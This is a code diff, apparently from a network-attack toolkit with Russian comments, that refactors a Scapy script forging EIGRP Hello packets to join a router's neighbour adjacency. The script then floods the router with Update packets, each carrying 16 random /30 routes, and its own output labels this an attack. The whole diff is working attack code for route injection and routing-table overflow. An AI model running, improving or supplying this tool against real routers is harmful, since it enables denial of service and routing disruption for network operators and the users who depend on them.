@@ -11,7 +11,7 @@ def eigrp_rto(interface):
         eigrp_hello_captured = False  # Не захвачен
 
         def analyze_packet(packet):
-            global target_mac, target_ip, autonomous_system, k1, k2, k3, k4, k5, hold_time, auth
+            global target_mac, target_ip, autonomous_system, k1, k2, k3, k4, k5, hold_time, auth, eigrp_hello_captured
             if packet.haslayer(EIGRP) and packet[EIGRP].opcode == 5:  # Если это EIGRP Hello
                 if packet.haslayer(EIGRPAuthData):
                     auth = True
@@ -25,8 +25,7 @@ def eigrp_rto(interface):
                 else:
                     auth = False
                     output_auth = "None"
-                global eigrp_hello_captured
-                eigrp_hello_captured = True  # Захвачен
+                    eigrp_hello_captured = True  # Захвачен
 
                 target_mac = (packet[Ether].src).upper()
                 target_ip = packet[IP].src
@@ -52,7 +51,7 @@ def eigrp_rto(interface):
         time.sleep(21)
 
         def send_eigrp_hello():  # Отправка EIGRP Hello соседнему роутеру каждые 5 сек
-            global target_mac, target_ip, autonomous_system, k1, k2, k3, k4, k5, hold_time  # , ios
+            global target_mac, target_ip, autonomous_system, k1, k2, k3, k4, k5, hold_time
             try:
                 while True:
                     hello_packet = (Ether(src="00:25:2e:01:ab:3c", dst="01:00:5e:00:00:0a") /
@@ -99,66 +98,28 @@ def eigrp_rto(interface):
             seq += 1
             try:
                 while True:
-                    network1 = str(random.randint(1, 254)) + "." + str(random.randint(1, 254)) + "." + str(
-                        random.randint(1, 254)) + "." + str(random.randrange(0, 253, 4))
-                    network2 = str(random.randint(1, 254)) + "." + str(random.randint(1, 254)) + "." + str(
-                        random.randint(1, 254)) + "." + str(random.randrange(0, 253, 4))
-                    network3 = str(random.randint(1, 254)) + "." + str(random.randint(1, 254)) + "." + str(
-                        random.randint(1, 254)) + "." + str(random.randrange(0, 253, 4))
-                    network4 = str(random.randint(1, 254)) + "." + str(random.randint(1, 254)) + "." + str(
-                        random.randint(1, 254)) + "." + str(random.randrange(0, 253, 4))
-                    network5 = str(random.randint(1, 254)) + "." + str(random.randint(1, 254)) + "." + str(
-                        random.randint(1, 254)) + "." + str(random.randrange(0, 253, 4))
-                    network6 = str(random.randint(1, 254)) + "." + str(random.randint(1, 254)) + "." + str(
-                        random.randint(1, 254)) + "." + str(random.randrange(0, 253, 4))
-                    network7 = str(random.randint(1, 254)) + "." + str(random.randint(1, 254)) + "." + str(
-                        random.randint(1, 254)) + "." + str(random.randrange(0, 253, 4))
-                    network8 = str(random.randint(1, 254)) + "." + str(random.randint(1, 254)) + "." + str(
-                        random.randint(1, 254)) + "." + str(random.randrange(0, 253, 4))
-                    network9 = str(random.randint(1, 254)) + "." + str(random.randint(1, 254)) + "." + str(
-                        random.randint(1, 254)) + "." + str(random.randrange(0, 253, 4))
-                    network10 = str(random.randint(1, 254)) + "." + str(random.randint(1, 254)) + "." + str(
-                        random.randint(1, 254)) + "." + str(random.randrange(0, 253, 4))
-                    network11 = str(random.randint(1, 254)) + "." + str(random.randint(1, 254)) + "." + str(
-                        random.randint(1, 254)) + "." + str(random.randrange(0, 253, 4))
-                    network12 = str(random.randint(1, 254)) + "." + str(random.randint(1, 254)) + "." + str(
-                        random.randint(1, 254)) + "." + str(random.randrange(0, 253, 4))
-                    network13 = str(random.randint(1, 254)) + "." + str(random.randint(1, 254)) + "." + str(
-                        random.randint(1, 254)) + "." + str(random.randrange(0, 253, 4))
-                    network14 = str(random.randint(1, 254)) + "." + str(random.randint(1, 254)) + "." + str(
-                        random.randint(1, 254)) + "." + str(random.randrange(0, 253, 4))
-                    network15 = str(random.randint(1, 254)) + "." + str(random.randint(1, 254)) + "." + str(
-                        random.randint(1, 254)) + "." + str(random.randrange(0, 253, 4))
-                    network16 = str(random.randint(1, 254)) + "." + str(random.randint(1, 254)) + "." + str(
-                        random.randint(1, 254)) + "." + str(random.randrange(0, 253, 4))
+                    networks = [
+                        ".".join(str(random.randint(1, 254)) for _ in range(3)) + "." + str(random.randrange(0, 253, 4))
+                        for _ in range(16)
+                    ]
 
                     prefix = 30
                     next_hop = "0.0.0.0"
 
-                    update_packet = (Ether(src="00:25:2e:01:ab:3c", dst=target_mac) / IP(dst=target_ip, ttl=1) /
-                                     EIGRP(opcode=1, asn=autonomous_system, seq=seq, flags=8) /
-                                     EIGRPIntRoute(nexthop=next_hop, dst=network1, prefixlen=prefix) /
-                                     EIGRPIntRoute(nexthop=next_hop, dst=network2, prefixlen=prefix) /
-                                     EIGRPIntRoute(nexthop=next_hop, dst=network3, prefixlen=prefix) /
-                                     EIGRPIntRoute(nexthop=next_hop, dst=network4, prefixlen=prefix) /
-                                     EIGRPIntRoute(nexthop=next_hop, dst=network5, prefixlen=prefix) /
-                                     EIGRPIntRoute(nexthop=next_hop, dst=network6, prefixlen=prefix) /
-                                     EIGRPIntRoute(nexthop=next_hop, dst=network7, prefixlen=prefix) /
-                                     EIGRPIntRoute(nexthop=next_hop, dst=network8, prefixlen=prefix) /
-                                     EIGRPIntRoute(nexthop=next_hop, dst=network9, prefixlen=prefix) /
-                                     EIGRPIntRoute(nexthop=next_hop, dst=network10, prefixlen=prefix) /
-                                     EIGRPIntRoute(nexthop=next_hop, dst=network11, prefixlen=prefix) /
-                                     EIGRPIntRoute(nexthop=next_hop, dst=network12, prefixlen=prefix) /
-                                     EIGRPIntRoute(nexthop=next_hop, dst=network13, prefixlen=prefix) /
-                                     EIGRPIntRoute(nexthop=next_hop, dst=network14, prefixlen=prefix) /
-                                     EIGRPIntRoute(nexthop=next_hop, dst=network15, prefixlen=prefix) /
-                                     EIGRPIntRoute(nexthop=next_hop, dst=network16, prefixlen=prefix))
+                    # Создание базового пакета
+                    update_packet = (Ether(src="00:25:2e:01:ab:3c", dst=target_mac) /
+                                     IP(dst=target_ip, ttl=1) /
+                                     EIGRP(opcode=1, asn=autonomous_system, seq=seq, flags=8))
+
+                    # Добавление маршрутов через цикл
+                    for network in networks:
+                        update_packet /= EIGRPIntRoute(nexthop=next_hop, dst=network, prefixlen=prefix)
                     sendp(update_packet, iface=interface, count=1, verbose=False)
 
                     seq += 1
                     total += 1
                     time.sleep(0.5)
-                    print(Fore.GREEN + f"    [+] EIGRP Updates: {total} packets sent, {total * 16} routes advertised", end="\r")  # Переведено
+                    print(Fore.GREEN + f"    [+] EIGRP Updates: {total} packets sent, ~{total * 16} routes advertised", end="\r")  # Переведено
 
             except KeyboardInterrupt:
                 print(Fore.YELLOW + f"\n\n    [!] Attack stopped (User pressed Ctrl + C)")  # Переведено
